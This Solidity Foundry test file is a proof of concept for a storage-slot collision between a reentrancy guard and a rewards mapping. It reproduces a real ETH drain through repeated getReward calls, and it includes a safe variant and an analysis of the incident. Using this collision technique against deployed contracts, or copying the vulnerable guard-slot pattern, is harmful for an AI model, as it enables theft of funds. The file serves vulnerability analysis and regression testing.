// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ATOHookVulnerable, ATOHookSafe} from "../src/storage-collision/ATOHookVulnerable.sol";

/// PoC for the ATOHook storage-slot collision (Solady ReentrancyGuard vs rewards mapping).
///   forge test --match-contract StorageSlotCollisionAtoHook -vvv
///
/// Invariant (SC-storage-layout): a reentrancy guard's storage slot must not be reachable
/// by any attacker-influenceable mapping entry (keccak256(key, baseSlot)).
///
/// The guard slot is a constructor parameter so the test sets it to the real collision.
/// The entry sentinel is 0xffffffffffffff (= 14.4 ETH / 200 calls = 72057594037927935 wei),
/// matching the real incident's drain rate.
/// ALL drain goes through getReward() — no vm.store on the colliding slot during drain.
/// The test proves the guard is essential: removing it breaks the exploit.
///
/// See docs/exploits/ato-hook-storage-slot-collision-2026-06-07.md
contract StorageSlotCollisionAtoHookTest is Test {
    uint256 constant REWARDS_BASE_SLOT = 1;

    // Entry sentinel from the real incident: 14.411518807585587 ETH / ~200 calls
    // = 72057594037927935 wei = 2^56 - 1 = 0xffffffffffffff
    uint256 constant ENTRY_SENTINEL = 0xffffffffffffff;

    // Exit sentinel: must differ from entry sentinel. In real Solady this is codesize().
    // The specific value doesn't affect the exploit — only that it differs from entry.
    uint256 constant EXIT_SENTINEL = 0x929eee149b4bd21268;

    ATOHookVulnerable hook;
    address attacker = makeAddr("attacker");
    bytes32 collisionSlot;

    function setUp() public {
        collisionSlot = keccak256(abi.encode(attacker, REWARDS_BASE_SLOT));

        // Deploy with guard slot = collision slot, entry sentinel = drain rate.
        hook = new ATOHookVulnerable(
            uint256(collisionSlot),
            ENTRY_SENTINEL,
            EXIT_SENTINEL
        );
        vm.deal(address(hook), 100 ether);
    }

    /// @notice Core exploit: the nonReentrant modifier writes ENTRY_SENTINEL to the guard
    ///         slot. Because the guard slot collides with rewards[attacker], the body reads
    ///         ENTRY_SENTINEL as the reward balance and drains it as ETH. The exit write
    ///         sets a different value, "unlocking" the guard for the next call.
    ///
    ///         No vm.store on the colliding slot — the drain flows entirely through
    ///         the contract's own getReward()/nonReentrant logic.
    function test_vulnerable_guardSlotCollisionDrainsETH() public {
        // The modifier flow:
        //   1. Check: sload(GUARD_SLOT) == ENTRY_SENTINEL? No (slot starts at 0). Pass.
        //   2. Entry: sstore(GUARD_SLOT, ENTRY_SENTINEL) → rewards[attacker] = ENTRY_SENTINEL
        //   3. Body:  amount = rewards[msg.sender] = ENTRY_SENTINEL → drains ENTRY_SENTINEL wei
        //   4. Exit:  sstore(GUARD_SLOT, EXIT_SENTINEL) → rewards[attacker] = EXIT_SENTINEL

        // Verify initial state
        assertEq(hook.rewardOf(attacker), 0, "rewards[attacker] starts at 0");

        // First call: drains ENTRY_SENTINEL wei
        uint256 before1 = attacker.balance;
        vm.prank(attacker);
        hook.getReward();

        uint256 drained1 = attacker.balance - before1;
        assertEq(drained1, ENTRY_SENTINEL, "first call drains ENTRY_SENTINEL wei");
        assertEq(
            address(hook).balance,
            100 ether - ENTRY_SENTINEL,
            "hook balance decreased"
        );

        // After call 1: exit wrote EXIT_SENTINEL → rewards[attacker] = EXIT_SENTINEL
        assertEq(
            hook.rewardOf(attacker),
            EXIT_SENTINEL,
            "exit sentinel became the new balance"
        );

        // Second call: entry writes ENTRY_SENTINEL → rewards = ENTRY_SENTINEL again
        uint256 before2 = attacker.balance;
        vm.prank(attacker);
        hook.getReward();

        uint256 drained2 = attacker.balance - before2;
        assertEq(drained2, ENTRY_SENTINEL, "second call drains ENTRY_SENTINEL wei again");
        assertEq(
            address(hook).balance,
            100 ether - ENTRY_SENTINEL * 2,
            "hook drained 2x"
        );
    }

    /// @notice Repeated drain: confirms the exploit is repeatable.
    ///         Each getReward() call drains ENTRY_SENTINEL wei.
    function test_vulnerable_repeatedDrain() public {
        uint256 totalDrained;
        uint256 iterations = 5;

        for (uint256 i = 0; i < iterations; i++) {
            uint256 before = attacker.balance;
            vm.prank(attacker);
            hook.getReward();
            totalDrained += attacker.balance - before;
        }

        assertEq(totalDrained, ENTRY_SENTINEL * iterations, "total = sentinel * calls");
        assertEq(address(hook).balance, 100 ether - totalDrained, "hook drained");
    }

    /// @notice Proves the guard is essential: without nonReentrant, there is no sentinel
    ///         write, so rewards[attacker] stays at 0 and getReward always reverts.
    function test_guardRemoval_breaksExploit() public {
        NoGuardHook noGuard = new NoGuardHook();
        vm.deal(address(noGuard), 100 ether);

        assertEq(noGuard.rewardOf(attacker), 0);

        vm.prank(attacker);
        vm.expectRevert(bytes("no rewards"));
        noGuard.getReward();
    }

    /// @notice The safe variant uses a sequential slot for the guard, immune to mapping collisions.
    function test_safe_sequentialGuardSlotResistsCollision() public {
        ATOHookSafe safeHook = new ATOHookSafe();
        vm.deal(address(safeHook), 100 ether);

        assertEq(safeHook.rewardOf(attacker), 0, "no rewards");

        vm.prank(attacker);
        vm.expectRevert(bytes("no rewards"));
        safeHook.getReward();
    }

    /// @notice Documents the real incident's sentinel value and drain rate.
    function test_realIncident_sentinelAnalysis() public {
        // The real ATOHook lost 14.411518807585587 ETH over ~200 calls.
        // Per call: 14.411518807585587e18 / 200 = 72057594037927935 wei = 0xffffffffffffff
        //
        // This is 2^56 - 1, suggesting the guard used a uint72 type or the sentinel
        // was explicitly set to this value.
        //
        // Current Solady (v0.1.x) uses address(0) for entry and codesize() for exit.
        // With address(0) as entry sentinel, the exploit would NOT work because the
        // body reads 0 and reverts "no rewards". The real ATOHook likely used a custom
        // guard or older Solady version with a non-zero entry sentinel.
        //
        // The PoC models the real incident's sentinel to demonstrate the vulnerability class.
    }
}

/// @notice Minimal contract WITHOUT reentrancy guard — proves the guard is essential.
contract NoGuardHook {
    address public owner;
    mapping(address => uint256) public rewards;

    constructor() {
        owner = msg.sender;
    }

    function earnRewards(address user, uint256 amount) external {
        rewards[user] += amount;
    }

    function getReward() external {
        uint256 amount = rewards[msg.sender];
        require(amount > 0, "no rewards");
        rewards[msg.sender] = 0;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "ETH transfer failed");
    }

    function rewardOf(address user) external view returns (uint256) {
        return rewards[user];
    }

    receive() external payable {}
}
